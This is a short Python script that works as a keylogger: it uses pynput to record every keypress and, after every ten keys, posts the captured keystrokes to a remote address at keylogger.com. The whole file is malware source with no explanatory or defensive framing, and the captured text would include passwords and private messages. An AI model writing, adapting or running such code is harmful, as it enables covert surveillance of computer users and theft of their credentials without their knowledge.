import pynput
import requests

log = []

def on_press(key):
    log.append(str(key))
    if len(log) >= 10:
        requests.post("http://keylogger.com/log", json={"keys": log})
        log.clear()

listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
